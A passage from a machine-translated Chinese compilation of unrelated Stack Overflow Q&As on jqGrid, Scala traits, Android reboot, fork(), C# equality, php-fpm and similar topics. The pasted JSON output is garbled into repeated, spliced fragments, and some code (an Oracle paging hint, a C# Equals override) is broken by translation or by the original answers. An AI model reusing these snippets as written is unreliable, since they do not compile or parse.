<script src="js/jquery-1.7.2.min.js" type="text/javascript"></script>
<script src="js/jquery-ui-1.8.23.custom.min.js" type="text/javascript"></script>
<script src="js/i18n/grid.locale-pt.js" type="text/javascript"></script>
<script src="js/jquery.jqGrid.min.js" type="text/javascript"></script>
</head>
<body>
    ...
<table id="datagrid"></table>
<div id="navGrid"></div>
<p><script language="javascript">
jQuery("#datagrid").jqGrid({
    url:'book.php',
    datatype: 'json',
    colNames:['ID','Nome', 'Apelido', 'Telefone','Email'],
    colModel:[
        {name:'ID',index:'ID', width:155,editable:false,editoptions:{readonly:true,size:10}},
        {name:'FIRSTNAME',index:'FIRSTNAME', width:180,editable:true,editoptions:{size:10}},
        {name:'LASTNAME',index:'LASTNAME', width:190,editable:true,editoptions:{size:25}},
        {name:'PHONE',index:'PHONE', width:160, align:"right",editable:true,editoptions:{size:10}},
        {name:'EMAIL',index:'EMAIL', width:160, align:"right",editable:true,editoptions:{size:10}}
    ],
    rowNum:10,
    rowList:[10,15,20,25,30,35,40],
    pager: '#navGrid',
    sortname: 'no',
    sortorder: "asc",
    height: 210,
    viewrecords: true,
    caption:"Example"
});
jQuery("#datagrid").jqGrid('navGrid','#navGrid',{edit:true,add:true,del:true});
</script>
</body>
</html> 
```

我得到的答案是 book.php：

{"page":2,"total":2,"records":"12","rows":[{"id":"1","cell":["1","fname1","lname1 ","(000)000-0000","name1@gmail.com"]},{"id":"2","cell":["2","fname1","lname1","(000 )000-0000","name1@gmail.com"]},{"id":"3","cell":["3","fname1","lname1","(000)000-0000" ,"name1@gmail.com"]},{"id":"4","cell":["4","fname1","lname1","(000)000-0000","name1@gmail .com"]},{"id":"5","cell":["5","fname1","lname1","(000)000-0000","name1@gmail.com"]},{"id":"6","cell":["6","fname1","lname1","(000)000-0000","name1@gmail.com "]},{"id":"7","cell":["7","fname1","lname1","(000)000-0000","name1@gmail.com"]},{ "id":"8","cell":["8","fname1","lname1","(000)000-0000","name1@gmail.com"]},{"id":" 9","cell":["9","fname1","lname1","(000)000-0000","name1@gmail.com"]},{"id":"10","cell ":["10","fname1","lname1","(000)000-0000","name1@gmail.com"]}]}单元格":["6","fname1","lname1","(000)000-0000","name1@gmail.com"]},{"id":"7","cell":[" 7","fname1","lname1","(000)000-0000","name1@gmail.com"]},{"id":"8","cell":["8","fname1 ","lname1","(000)000-0000","name1@gmail.com"]},{"id":"9","cell":["9","fname1","lname1" ,"(000)000-0000","name1@gmail.com"]},{"id":"10","cell":["10","fname1","lname1","(000) 000-0000","name1@gmail.com"]}]}单元格":["6","fname1","lname1","(000)000-0000","name1@gmail.com"]},{"id":"7","cell":[" 7","fname1","lname1","(000)000-0000","name1@gmail.com"]},{"id":"8","cell":["8","fname1 ","lname1","(000)000-0000","name1@gmail.com"]},{"id":"9","cell":["9","fname1","lname1" ,"(000)000-0000","name1@gmail.com"]},{"id":"10","cell":["10","fname1","lname1","(000) 000-0000","name1@gmail.com"]}]}]},{"id":"7","cell":["7","fname1","lname1","(000)000-0000","name1@gmail.com"]},{" id":"8","cell":["8","fname1","lname1","(000)000-0000","name1@gmail.com"]},{"id":"9 ","cell":["9","fname1","lname1","(000)000-0000","name1@gmail.com"]},{"id":"10","cell" :["10","fname1","lname1","(000)000-0000","name1@gmail.com"]}]}]},{"id":"7","cell":["7","fname1","lname1","(000)000-0000","name1@gmail.com"]},{" id":"8","cell":["8","fname1","lname1","(000)000-0000","name1@gmail.com"]},{"id":"9 ","cell":["9","fname1","lname1","(000)000-0000","name1@gmail.com"]},{"id":"10","cell" :["10","fname1","lname1","(000)000-0000","name1@gmail.com"]}]}fname1","lname1","(000)000-0000","name1@gmail.com"]},{"id":"9","cell":["9","fname1","lname1 ","(000)000-0000","name1@gmail.com"]},{"id":"10","cell":["10","fname1","lname1","(000 )000-0000","name1@gmail.com"]}]}fname1","lname1","(000)000-0000","name1@gmail.com"]},{"id":"9","cell":["9","fname1","lname1 ","(000)000-0000","name1@gmail.com"]},{"id":"10","cell":["10","fname1","lname1","(000 )000-0000","name1@gmail.com"]}]}

有人能帮我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-04T13:55:52.730

分页数据查询有问题，换个分页查询试试：

```
SELECT * FROM 
     (
       SELECT / * + FIRST_ROWS (n) * / *, ROWNUM rnum FROM (our query) 
 WHERE ROWNUM <= limit-sup
     )
 WHERE rnum > = limit-inf; 
```

希望能帮到你，祝你好运。

# scala - 静态和动态特征混合有什么区别

> ID：12461797
> 
> 赞同：7
> 
> 时间：2012-09-17T14:48:42.383
> 
> 标签：scala, traits

考虑：

```
abstract class Base {
  def something() = println("Base")
}

trait TraitA extends Base {
    abstract override def something() = { super.something(); println("TraitA"); }
}

class Child extends Base {
    override def something() {
        println("Child")
    }
} 
```

接着：

```
val x = new Child with TraitA
x.something() 
```

我得到：

```
Child
TraitA 
```

但如果我使用：

```
class Child extends Base with TraitA {
    override def something() {
        println("Child")
    }
}

val x = new Child
x.something() 
```

我只会得到：

```
Child 
```

那么在施工现场或申报现场使用 trait 有什么不同呢？在类的声明中扩展/使用特征时，我可以有第一个行为（可堆叠特征）吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-17T16:50:44.117

> Scala 中的可堆叠特征是指能够混合多个特征，这些特征协同工作以对方法应用多种修改。这涉及调用 super.theMethod 并修改其输入和/或输出。但是在特质的背景下，什么是超级？特征扩展的类（或特征）？特质被混入的类别？这取决于！所有混合的特征和所有超类都是线性化的。super 调用链上最靠近的前面的定义。

[阅读全文](http://www.lorrin.org/blog/2012/08/09/scalas-abstract-override-stackable-traits-and-object-hierarchy-linearization/)

在您的情况下：
1\. super.something() == Child.something()
2\. super.something() == Base.something() 和 Child.something() 覆盖整个链

mixin 的类型无关紧要：

```
class Child2 extends Child with TraitA

val x2 = new Child2
x2.something() 
/* 
   Child
   TraitA
*/

class Child3 extends Base with TraitA
val x3 = new Child3
x3.something()
/* 
   Base
   TraitA
*/ 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-17T16:34:04.317

在第一个示例中，您覆盖了`Base`first 的方法，然后您混合`TraitA`了将堆栈的方法。

在第二个示例中，首先混合`TraitA`，然后覆盖生成的（堆叠）方法。

# android - 重新启动运行 4.0 的 Android 设备

> ID：12461800
> 
> 赞同：0
> 
> 时间：2012-09-17T14:48:50.760
> 
> 标签：android, exception, reboot

我在清单中设置了权限：

```
<uses-permission android:name="android.permission.REBOOT" /> 
```

我调用以下几行来重新启动设备：

```
Intent intent = new Intent(Intent.ACTION_REBOOT);
sendBroadcast(intent); 
```

由于我在模拟器中有root权限，我很好奇为什么会遇到以下错误：

```
 Permission Denial: not allowed to send broadcast android.intent.action.REBOOT from pid=963, uid=10046 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:51:49.113

REBOOT 权限仅授予具有平台签名或系统应用程序的应用程序。

作为 root 可能允许您以 root 身份运行命令，但您的应用程序仍然不是。（不过，您可以 sudo 调用关闭命令）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-09-18T17:23:14.183

如果有人仍在寻找并且我们确实在谈论有根设备，请阅读[此答案](https://stackoverflow.com/questions/4580254/android-2-2-reboot-device-programmatically/25918667#25918667)。

以下代码示例应该这样做（根据请求添加）：

```
Process rebootProcess = null;
try
{
    rebootProcess = Runtime.getRuntime().exec("su -c reboot now");
}
catch (IOException e)
{
    // Handle I/O exception.
}

// We waitFor only if we've got the process.
if (rebootProcess != null)
{
    try
    {
        rebootProcess.waitFor();
    }
    catch (InterruptedException e)
    {
        // Now handle this exception.
    }
} 
```

# android - 自定义字体的有效方法

> ID：12461801
> 
> 赞同：1
> 
> 时间：2012-09-17T14:48:54.783
> 
> 标签：android, memory, fonts, textview

> **可能重复：**
> [Android - 使用自定义字体](https://stackoverflow.com/questions/3651086/android-using-custom-font)

在 Android 应用程序中自定义字体的最佳或有效方法是什么？我一直在尝试自定义我的 Textviews 和 Edittexts，但我的应用程序有点慢，因为我正在使用自定义字体并且占用大量内存，有时甚至崩溃。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-17T15:08:31.587

我严重怀疑您的应用程序的缓慢是您使用自定义字体的结果。这可能是您应用它们的方式。通常，我会在我的 Activity 中执行以下操作：

```
//Get an instance to the root of your layout (outermost XML tag in your layout
//document)
ViewGroup root = (ViewGroup)findViewById(R.id.my_root_viewgroup);

//Get one reference to your Typeface (placed in your assets folder)
Typeface font = Typeface.createFromAsset(getAssets(), "My-Font.ttf");

//Call setTypeface with this root and font
setTypeface(root, font);

public void setTypeface(ViewGroup root, Typeface font) {
    View v;

    //Cycle through all children
    for(int i = 0; i < root.getChildCount(); i++) {
        v = root.getChildAt(i);

        //If it's a TextView (or subclass, such as Button) set the font
        if(v instanceof TextView) {
            ((TextView)v).setTypeface(font);

        //If it's another ViewGroup, make a recursive call
        } else if(v instanceof ViewGroup) {
            setTypeface(v, font);
        }
    }
} 
```

这样，您只保留一个对您的字体的引用，并且您不必对任何视图 ID 进行硬编码。

您也可以将其构建为 的自定义子类`Activity`，然后让您的所有 Activity 扩展您的自定义 Activity 而不是仅仅扩展 Activity，然后您只需编写一次此代码。

# extjs4 - 如何在组件内缓存子组件实例

> ID：12461802
> 
> 赞同：6
> 
> 时间：2012-09-17T14:48:58.427
> 
> 标签：extjs4, sencha-touch, sencha-touch-2

我在网上找到了很多 Sencha Touch 示例，并没有真正关注正确的视图封装。因此，即使按钮深嵌套在视图中，控制器也会监听每个按钮的事件。换句话说，视图的内部泄漏从来都不是一件好事。

我找到了一个很好的教程，它鼓励您创建有意义的视图来聆听本地事件并引发有意义的业务事件等。

[http://miamicoder.com/2012/how-to-create-a-sencha-touch-2-app-part-2/](http://miamicoder.com/2012/how-to-create-a-sencha-touch-2-app-part-2/)

然而，到目前为止我还没有真正弄清楚的一件事是如何最好地缓存嵌套的组件实例。考虑这个例子：

```
Ext.define("NotesApp.view.NotesListContainer", {
    extend: "Ext.Container",
    alias: "widget.noteslistcontainer",

    initialize: function () {

        this.callParent(arguments);

        var newButton = {
            xtype: "button",
            text: 'New',
            ui: 'action',
            handler: this.onNewButtonTap,
            scope: this
        };

        var topToolbar = {
            xtype: "toolbar",
            title: 'My Notes',
            docked: "top",
            items: [
                { xtype: 'spacer' },
                newButton
            ]
        };

        this.add([topToolbar]);
    },
    onNewButtonTap: function () {
        console.log("newNoteCommand");
        this.fireEvent("newNoteCommand", this);
    },
    config: {
        layout: {
            type: 'fit'
        }
    }
}); 
```

假设我们想向`setSpecialUIState`我们的`NotesListContainer`. 当它被调用时，我们想要对它做一些事情`newButton`（例如隐藏它）。`newButton`我如何在不滥用该实例的情况下访问该实例`Ext.getComp()`？我可以将其设置为实例变量吗？规范的方式如何？

**更新**

我只是按照 Nikolaj Borisik 的建议尝试了这个。

```
 this._newButton = this.add([{
            xtype: "button",
            text: 'New',
            ui: 'action',
            handler: this.onNewButtonTap,
            scope: this
        }]; 
```

这就像一个魅力。我只是不知道这样做是否符合习惯，或者是否有任何我可能遗漏的缺点。否则我强烈建议这样做。撇开 Sencha 不谈，编写有意义的视图来抽象出连贯的 UI 部分要好得多。这比将每个按钮都泄漏到控制器并直接摆弄它们要好得多。

所以我想知道这种方法是否有任何缺点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T18:50:00.630

除了使用 getComponent() 之外，我看到了两个选项：

1 使用 Ext.create(...) 作为实例组件

```
initialize: function () {        
   this.callParent(arguments);
   this.newButton = Ext.create('Ext.Button',{
      xtype: "button",
      text: 'New',
      ui: 'action',
      handler: this.onNewButtonTap,
      scope: this
   });
   //....
},

setSpecialUIState : function(){
   this.newButton.hide()
} 
```

2 将此逻辑移动到控制器中并使用 refs 部分

```
Ext.define('NotesApp.controller.Home',{
        extend : 'Ext.app.Controller',

        config : {
            refs :{
                newButton : '#noteList [itemId=newButton]'
            },

            control :{
                newButton : {
                    tap : 'onNewButtonTap'
                }
            }

        },

        onNewButtonTap : function(){
            console.log('on new Button tap');
        },

        setSpecialUIState : function(){
           this.getNewButton.hide()
        }

    });

Ext.define("NotesApp.view.NotesListContainer", {
    extend :"Ext.Container",
    alias  :"widget.noteslistcontainer",
    id     :'noteList',
    config:{
        items:[
            {
                xtype  :"toolbar",
                title  :'My Notes',
                docked :"top",
                items:[
                    { xtype:'spacer' },
                    {
                        xtype   :"button",
                        text    :'New',
                        ui      :'action',
                        itemId  :'newButton'
                    }
                ]
            }
        ]

    }
}); 
```

我更喜欢第二种选择

我使用这两个选项，但在不同的情况下。我认为第一个选项更适合可以在应用程序的其他部分甚至其他项目中重用的组件。但是当我们创建一些只能使用一次的视图时，我认为没有必要从视图中触发自定义事件。我们编写更多代码，并复制它。是的，'newNoteCommand' 比 'tap' 更清晰，但是 { control : '#noteList [itemId='newButton'] 给了我们所有必要的信息。第二为什么我更喜欢第二种选择，当我们有深层嵌套的组件时。在这种情况下，我们应该在第一个组件中触发事件，而不是从他的父级触发事件等等，直到控制器有机会处理它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-08T11:56:31.150

在我花了更多时间在 Sencha 上后，我发现我对`Ext.getCmp()`. 我认为这将首先查询 DOM 以找到匹配的 ID，然后尝试获取绑定到它的组件实例。但是，这不是它的作用。事实上，它根本不查询 DOM。它只是查询一个名为 ComponentManager 的工具，该工具包含对所有正在使用的组件的引用。

所以，使用它并没有**那么**脏。但是，我们仍然可以做得更好。

每个容器都支持方法`child(selector)`并`down(selector)`查询子组件。乍一看，这似乎是在查询 DOM，但同样只查询 ComponentManager。它在起点使用容器并向下查询它的内部项目。两者的区别在于`child(selector)`只查询第一个子级别，而`down(selector)`查询所有子级别。

我想使用它们来处理这些子组件是可以的。但是，如果由于重复调用这些方法而仍然存在性能问题，我建议在第一次检索后缓存它们。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-19T17:22:07.250

我认为 MVVM 架构更符合您的思维方式。'VM' 有一个类似控制器的组件，它将视图与数据/操作连接起来。KnockoutJS 遵循这种范式并将数据处理嵌入到您的视图中。

来自服务器端 MVC 模式，将代码嵌入 JSP 是一个很大的禁忌。您只使用了可以执行最少逻辑来呈现数据的标签。关于以一致的方式执行此操作以大大提高代码的可维护性，有一些话要说。

但是，像您一样，我发现为所有按钮处理程序引用控制器有点霸道。我认为你可以判断我的行动逻辑在哪里。如果您的操作可重用，请务必使用 DRY 主体。如果您正在执行具有有限逻辑的简单视图特定操作 - 我可能会跳过控制器。

为了解决控制器对您的视图了解太多......我同意它会导致重构问题。您可以通过使您的按钮处理程序从其父视图发出自定义事件来解决此问题。这样你的控制器只需要监听它已经知道的视图组件的事件。缺点是您需要更大的自定义事件数组并很好地记录它们，就像 sencha 对它们的事件所做的那样。否则可维护性也会受到影响。

# java - jmenu 无法在 mac OS X 上正确转移焦点

> ID：12461803
> 
> 赞同：1
> 
> 时间：2012-09-17T14:49:01.267
> 
> 标签：java, macos, applet, focus, jmenu

我有一个使用 JMenuBar 的网络小程序。在 Windows 上一切正常，但 OS X 是另一回事。由于某种原因，JMenus 没有使用 OS X safari 组合正确地将焦点转移到他们的孩子身上。子菜单和项目应在鼠标悬停时突出显示，但不要。当用户按下 JMenu 并在他们浏览子菜单时保持鼠标按下时，所有内容都会突出显示。我还注意到，这只发生在嵌入在小程序内容窗格中的 JMenus 上。如果小程序生成一个带有 JMenu 的单独 JFrame 窗口，则焦点正确传递。任何帮助或见解将不胜感激。

# javascript - 如何在选项值中包含空格

> ID：12461805
> 
> 赞同：-1
> 
> 时间：2012-09-17T14:49:01.563
> 
> 标签：javascript, xml, dom

我正在使用 XML 和 javascript 构建一个零件号交叉引用工具。（非常）少数零件号包含空格。我正在根据正在工作的 XML 数据构建下拉列表，但包含空格的部件号除外。那些零件号的选项值在空格字符的位置被截断，然后查找交叉参考是混淆的。我尝试将 XML 文件中的空格替换为 - 但我的 XML 编辑器（XML Spy）不允许这样做。我试过使用 %20，有趣的是交叉引用（“正则表达式”比较）正在工作，但是在下拉列表和显示的结果中，部件号看起来很糟糕（它们包括“%20”） .

有任何想法吗？提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-18T12:33:55.393

好的，我知道发布我的代码会很有用（我可能最终会这样做） - 但我一直在使用它并发现了一个解决方案。我最近读到，用这样的内联 JS 构建列表是一种糟糕的做法：

```
 <select id="dropdown-smcNums" onChange="">
       <script language="javascript">       
         for (var j=0;j<smcNums.length;j++){
             document.write("<option value="+smcNums[j].lastChild.nodeValue+">"+smcNums[j].lastChild.nodeValue+"</option>");
         }
        </script>
     </select> 
```

所以我花了一些时间将列表的构建移动到我的 .JS 文件中，如下所示：

```
 function loadSelect(){
      for (var i=0;i<smcNums.length;i++){
        var opt = document.createElement("option");
        opt.text = smcNums[i].lastChild.nodeValue;
        opt.value = smcNums[i].lastChild.nodeValue;
        document.getElementById("dropdown-smcNums").options.add(opt);
      }
    } 
```

只有：

```
 <select id="dropdown-smcNums" onChange=""></select> 
```

在我的 html 文件中。

空格字符的问题就消失了。

# ruby - 在其子模型中使用在父模型中定义的范围（STI 模式）

> ID：12461806
> 
> 赞同：5
> 
> 时间：2012-09-17T14:49:04.860
> 
> 标签：ruby, ruby-on-rails-3, sti

我使用 STI 模式实现了一个类层次结构

```
class A
  scope :aaa, where([someField]:[someValue])
end

class B < A
end 
```

问题是当我尝试调用类似的东西时：

```
B.limit(5).aaa
=> SELECT "[table]".* FROM "[table]" WHERE "[table]"."type" IN ('A') AND ([someField] = [someValue]) LIMIT 5 
```

所以我得到了 5 个 A 类型的对象，它们满足范围：aaa 但我需要对 type = "B" 的行做同样的事情

有没有办法使用父级的范围，而不用 STI 模式在子级中重新定义它？

提前致谢

**已编辑**

我刚和朋友讨论过，他给我看了一件重要的事情。A 不是 STI 的根类。事实上整个层次结构看起来像

```
class O < ActiveRecord::Base
end

class A < O
  scope ..... .....
end

class B < A
end 
```

也许原因在于等级制度本身？...

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-20T16:33:45.070

You are correct that this is a result of the multi-level hierarchy.

The scope would work as expected if you had just one level of inheritance (i.e. if `A` inherited from `ActiveRecord::Base` instead of inheriting from `O`).

STI in Rails does not always work as expected once you have intermediate classes.

I'm not sure if this is a bug in Rails or just a result of it not being feasible to infer exactly what should be done. I'll have to research that more.

The scope issue you experienced is just one example of the unexpected behavior. Another example is that querying the intermediate class will only query for the class types it is aware of, which may not include all of its subclasses unless you specifically require them:

See the following thread for more information, especially the post at the bottom by MatthewRudy: [https://groups.google.com/forum/#!topic/hkror/iCg3kxXkxnA](https://groups.google.com/forum/#!topic/hkror/iCg3kxXkxnA)

If you still want to use scopes instead of class methods as suggested by @Atastor, you can put the scope on `O` instead of `A`. This isn't ideal since the scope may not be applicable to every subclass of `O`, but it does seem to cause Rails to query the correct classes in the `type` column, and is a quick workaround.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T15:36:50.727

我会切换到使用类方法而不是范围，例如在 A 类中

```
def self.aaa
  A.where([someField]:[someValue])
end 
```

然后在B级

```
def self.bbb
  self.aaa.where("type = ?","B")
end 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-02-18T15:17:06.710

注意 STI 中间类，因为它会弄乱您尝试的范围。

就我而言，我有：

```
class A < ActiveRecord
blabla
end
class B < A
scope :dates, ->(start_date, end_date) { where(:date => start_date..end_date) }
end
class C < B
<call scope_dates>
end
class D < B
<call scope_dates>
end 
```

范围实际上包括C类和D类的组合。

**所以，如果你在 Rails 中有 STI 请将范围放在基类中，而不是中间类**

# c - 在 fork() 之后打印子编号

> ID：12461808
> 
> 赞同：-2
> 
> 时间：2012-09-17T14:49:08.797
> 
> 标签：c, unix, operating-system

我正在阅读一本关于操作系统的书，并且对 C 编程也相当陌生（往往会使事情复杂化），但我很好奇为什么当每个孩子都是通过 fork() 创建时我不能打印递增的 i 值。它与子进程或其他东西有关吗？提前致谢。

```
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main ()
{
    pid_t pid;
    int i = 1;

    pid = fork();
    pid = fork();
    pid = fork();
    pid = fork();

    if (pid == 0) {
        printf("got child %d\n", i);
        i++;
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:52:50.313

使用`getpid()`and`getppid()`作为父子进程 ID。

例子在[这里](http://www.dailyfreecode.com/code/fork-child-print-process-id-parent-2179.aspx)

```
int main()
{

        int i;
        printf("hello before fork \n");
        printf("i : %d\n",i);

        i=fork();
        printf("\n");

        if(i==0)
        {

                printf("Child has started\n\n");
                printf("child printing first time \n");

                printf("getpid : %d getppid : %d \n",getpid(),getppid());
                sleep(5);
                printf("\nchild printing second time \n");
                printf("getpid : %d getppid : %d \n",getpid(),getppid());
        }
        else
        {
                printf("parent has started\n");
                printf("getpid : %d  getppid : %d \n",getpid(),getppid());
                printf("\n");

        }

        printf("Hi after fork i : %d\n",i);

        return 0;

} 
```

> 输出：
> 
> [04mca8@LINTEL pp]$ ./a.out 你好前叉 i : 134514088
> 
> 孩子开始了
> 
> 孩子第一次打印 getpid : 8354 getppid : 8353
> 
> 父母已经开始 getpid : 8353 getppid : 5656
> 
> 分叉后您好：8354 [04mca8@LINTEL pp]$ 子打印第二次 getpid：8354 getppid：1 分叉后您好：0

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:53:24.093

您无法打印增加的值，因为`i`在增加后未打印。分离出来的进程`fork()`不共享资源，它们每个都得到一个独立的`i`. 所以你会看到：

```
got child 1 
```

一遍又一遍。试试这个调整，你会看到每个子进程都以相同的值进入条件：

```
int main () {
  pid_t pid;
  int i = 1;
  pid = fork();
  pid = fork();
  pid = fork();
  pid = fork();
  if (pid == 0) {
     printf("the child %d, got %d\n", getpid(), i);
     i++;
  }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-17T14:54:28.903

每个父/子都有一个单独的内存堆栈，因此每个人都会获得自己`i`设置的版本。所以`printf`将只打印 1 - 即其中的 16 个。

使用`getpid`和`getppid`。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-17T14:55:29.217

您的代码根本没有任何意义。

1.  每次调用`fork()`都会在此时创建一​​个新进程。
2.  然后，这两个进程中的每一个都将在`fork()`.
3.  这意味着您的第二个`fork()`将由*两个*进程调用；原来的一个和第一个创建的孩子`fork()`。
4.  等等。
5.  你覆盖`pid`了很多次，然后检查它是否为 0。
6.  您 print `i`， not ，并在打印*后*`pid`递增它，这将无效。

 *请进一步研究这些东西，您似乎有些困惑。*

# c# - 从包含具有数组元素的类的列表中删除重复项

> ID：12461809
> 
> 赞同：2
> 
> 时间：2012-09-17T14:49:08.443
> 
> 标签：c#, list, duplicate-removal

我有一个包含类对象的列表。包含各种项目的类，包括 int 和 double 数组。这个类看起来像这样。

```
public class NewChildren
{
    public double[] fitnessValue{get;set;}

    public int[] locationScheme{get;set;}

    public double crowdingDistance{get;set;}
} 
```

由于列表可能包含重复的项目，我有兴趣删除它们。在网上，我看到了一些基于 Linq 的解决方案，它们使用 Distinct() 和 GroupBy() 方法。但是，这些方法似乎不起作用，因为对象中有数组（MSVS2008 不会给出任何错误，但也不会删除任何项目）。

任何建议（包括参考资料或代码）都将受到高度赞赏。提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T15:02:39.843

您必须问自己的问题是，当两个实例相`NewChildren`同时？由于您在那里有列表，因此这可能不是一个容易回答的问题。当你定义了这个，你必须在你的类中实现相等方法：

```
public class NewChildren
{
    public double[] fitnessValue{get;set;}

    public int[] locationScheme{get;set;}

    public double crowdingDistance{get;set;}

    public bool override Equals(object other)
    {
        // ... implement your rules for equality here
    }
} 
```

现在，要这样做，您必须始终遵循[Microsoft 指南](http://msdn.microsoft.com/en-us/library/ms173147%28v=vs.80%29.aspx)。覆盖平等并不是*那么*简单，尽管它并不复杂。例如，您将拥有所有具有相同元素的数组：

```
public bool override Equals(object other)
{
    if (other == null || !(other is NewChildren)) 
    {
        return false;
    }

    var another = (NewChildren)other;

    return AreEquivalent(this.fitnessValue, another.fitnessValue)
        && AreEquivalent(this.locationScheme, another.locationScheme)
        && AreEquivalent(this.crowdingDistance, another.crowdingDistance);

}

public static bool AreEquivalent<T>(T[] a, T[] b)
{
    return a1.OrderBy(a => a).SequenceEqual(a2.OrderBy(a => a));
} 
```

数组相等的实现取自[这里](https://stackoverflow.com/a/703857/227332)。您可以使用[此参考](https://stackoverflow.com/a/3790621/227332)对其进行优化。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:55:20.577

As stated in the [docs](http://msdn.microsoft.com/en-us/library/bb348436.aspx), `Distinct` uses the default equality comparer by default. That default equality comparer recognizes each of the items in your list as distinct from all others because it checks on instance identity.

As stated in the aforementioned docs, in order to compare a custom type and define equality like you want, you will need to implement some comparison-related methods on your class:

> To compare a custom data type, you need to implement [[`IEquatable<T>`](http://msdn.microsoft.com/en-us/library/ms131187.aspx)] and provide your own [`GetHashCode`](http://msdn.microsoft.com/en-us/library/system.object.gethashcode.aspx) and [`Equals`](http://msdn.microsoft.com/en-us/library/system.object.equals.aspx) methods for the type.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T14:59:44.447

默认情况下，通过检查引用相等来评估从类创建的对象的 Equals 方法和相等运算符。这意味着两个项目只有在它们引用同一个类的实例时才相等。您要么需要更改查询以检查类中的各个属性，要么实现适当方法和运算符的覆盖。

请参阅 MSDN 上的以下内容：

*   [实现等式和等式运算符 (==) 的指南](http://msdn.microsoft.com/en-us/library/7h9bszxx%28v=VS.100%29.aspx)
*   [IEquatable 接口](http://msdn.microsoft.com/en-us/library/ms131187.aspx)

# fastcgi - php-fpm 打开的文件太多

> ID：12461810
> 
> 赞同：7
> 
> 时间：2012-09-17T14:49:15.377
> 
> 标签：fastcgi, php

我正在运行 nginx 作为前端和 php-fpm 作为后端来处理 php 文件。我的 /var/log/php-fpm/error.log 上出现“打开的文件太多”错误。我已将硬软 ulimit 增加到 65535，但似乎无法解决问题。

**/var/log/php-fpm/error.log**

```
[17-Sep-2012 14:43:51] ERROR: failed to prepare the stderr pipe: Too many open files (24)
[17-Sep-2012 14:43:52] ERROR: failed to prepare the stderr pipe: Too many open files (24) 
```

**ulimit -n**

```
65535 
```

**/etc/php-fpm/www.conf**

```
rlimit_files = 65535 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-19T21:16:24.927

您可以使用 **lsof**（列出打开的文件）进行检查，可能需要安装它，因为大多数 linux 发行版默认不包含此功能。它应该让您了解这些打开的文件是哪些以及拥有它的进程（这样您就可以 grep for php）。做一个**lsof | wc -l**来计算那些。真的有这么多开放吗？或者也许这个错误更像是更深层次的东西的症状。如果您知道它们是什么，也许这将为您提供线索...

看看它提到 STDERR 的事实，它可能与广义上的错误相关（也许是 php-fpm 的错误配置参数？）

此外，请检查您使用的是 unix 套接字还是 tcp 套接字，请尝试使用 tcp 选项，除非您在 BSD 上，并且认为 unix 套接字工作得更快。

# entity-framework - 快速切换数据上下文

> ID：12461811
> 
> 赞同：0
> 
> 时间：2012-09-17T14:49:16.263
> 
> 标签：entity-framework, c#-4.0, ado.net

所以我有一个 ADO.NET 对象，用于通过数据上下文访问数据库。

我在 2 个具有非常相似架构的独立数据库中拥有测试数据。我正在考虑从 2 个数据库创建 2 个模型。但我不确定“切换”模型最简单的方法是什么。

理想情况下，我希望能够通过更改 1 行代码来切换上下文。切换仅用于诊断目的。

由于我从几种方法访问此模型，因此我不能（轻松）创建数据上下文的静态实例，然后只在开始时更改上下文的模型，因为我必须在方法中显式声明上下文的类型参数（然后每次更改模型时更改类型）。

像这样的东西：

```
(using SF_EntitiesDEV1 ctx = new SF_EntitiesDEV1()) {
    checkForStrangeStuff(ctx);
    runTests(ctx);
    checkResults(ctx);
    ... etc
} 
```

现在，如果我想将 SF_EntititesDEV1 更改为 SF_EntitiesDEV2，我必须更改每个方法中的方法参数类型。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T15:14:33.310

如果您还没有，我会考虑使用通用存储库方法。您将找到的大多数示例将使用通用 repo 来执行 CRUD 工作，但我不明白为什么您不能使用它来完成您需要的工作。

本质上，您将在其构造函数中设置一个将上下文（接口）作为参数的类。然后在实例化存储库并调用它的方法时传入要使用的上下文。

[在这里](http://www.tugberkugurlu.com/archive/generic-repository-pattern-entity-framework-asp-net-mvc-and-unit-testing-triangle)查看有关如何设置通用存储库的很好的讨论。

# r - R 和 cytoscape 导入网络

> ID：12461813
> 
> 赞同：0
> 
> 时间：2012-09-17T14:49:18.467
> 
> 标签：r, cytoscape

我尝试使用 RCytoscape 包将网络从 R 导出到 cytoscape。我试图遵循文档但失败了。以下是我使用的命令：

```
data(liver.toxicity)
X <- liver.toxicity$gene
Y <- liver.toxicity$clinic
toxicity.spls <- spls(X, Y, ncomp = 3, keepX = c(50, 50, 50), keepY = c(10, 10, 10))
result<-network(toxicity.spls, comp = 1:3, threshold = 0.8, 
 X.names = NULL, Y.names = NULL, keep.var = TRUE,
 color.node = c("mistyrose", "lightcyan"),
  shape.node = c("rectangle", "circle"),
  color.edge = c("red", "blue"),
   lty.edge = c("solid", "solid"), lwd.edge = c(1, 1), 
   show.edge.labels = FALSE, interactive = FALSE)
  library(RCytoscape)
  cw <- CytoscapeWindow ("result", graph=makeSimpleGraph())
  displayGraph (cw) 
```

而不是导入 42 个顶点和 78 条边，它只导入文档中显示的这三个边和节点。我没有意识到 whee 犯了错误。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T16:29:36.130

如果“结果”是您的图表，那么这应该有效：

```
cw <- CytoscapeWindow ("result", graph=result);
